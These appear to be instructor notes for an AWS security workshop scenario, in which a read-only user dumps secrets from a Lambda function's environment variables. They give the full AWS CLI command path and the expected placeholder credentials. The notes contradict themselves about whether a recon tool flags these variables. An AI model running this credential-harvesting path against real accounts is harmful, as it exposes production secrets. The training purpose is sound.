# Scenario 5 — Attack bullets (morning, ~15 min)

Source: Lab 1 Exercise 7. Identity: `iamws-secrets-reader-user`. Target: secrets in env vars on `iamws-app-with-secrets` Lambda. **Note:** this is *credential access*, not IAM privilege escalation — no crown jewels payoff (deliberately), but the leaked secrets *are* the payoff.

## Pre-attack — recon with iam-recon

- `iam-recon --account $ACCOUNT_ID argquery --principal user/iamws-secrets-reader-user --action lambda:GetFunctionConfiguration` → ALLOW line confirms read permission on all functions. **This is the only iam-recon recon surface that catches this scenario.**
- ⚠️ `iam-recon --account $ACCOUNT_ID analysis` does **not** flag Lambda functions with sensitive env vars — verified 2026-05-12, iam-recon has no env-var/secrets detector. The `analysis` preset only reports privilege-escalation findings (the same set you'd see in `pathfinding`).
- ⚠️ `iam-recon --account $ACCOUNT_ID pathfinding` has no Credential Access category either. This scenario is credential access not privesc, so the right move is "use `argquery` for the permission, then enumerate functions with env vars via the AWS CLI" — there is no iam-recon "find sensitive env vars" preset today. That's a teaching moment about iam-recon's coverage limits.

## Exploit — full command path

```bash
# Step 1: confirm identity
aws sts get-caller-identity --profile iamws-secrets-reader-user

# Step 2: enumerate Lambdas that have env vars
aws lambda list-functions \
  --query 'Functions[?Environment.Variables].FunctionName' \
  --output table --profile iamws-secrets-reader-user
# note: iamws-app-with-secrets

# Step 3: dump the env vars
aws lambda get-function-configuration \
  --function-name iamws-app-with-secrets \
  --query 'Environment.Variables' --output json \
  --profile iamws-secrets-reader-user

# expect:
# {
#   "DB_HOST": "prod-db.example.internal",
#   "DB_USERNAME": "app_service_account",
#   "DB_PASSWORD": "SuperSecretPassword123!",
#   "API_KEY": "sk-prod-api-key-do-not-expose",
#   "ADMIN_CREDENTIALS": "admin:P@ssw0rd!"
# }
```

## Demo bullets

- Highlight: zero IAM escalation, but production DB creds + API keys + admin password in the open.
- Walk through iam-recon's `analysis` output and show the env-var finding.
- Bridge to defense: this is the one scenario where the fix is *architectural* (move to Secrets Manager), not just a policy edit.

## Open question

- Outline mentions a separate "UpdateFunctionConfiguration" Lambda scenario in the afternoon. If that's a real second attack (writing env vars to inject backdoor creds or alter behavior), we should add an `attack-write.md` here or split into a Scenario 5a / 5b. Currently treating as a typo for Get.
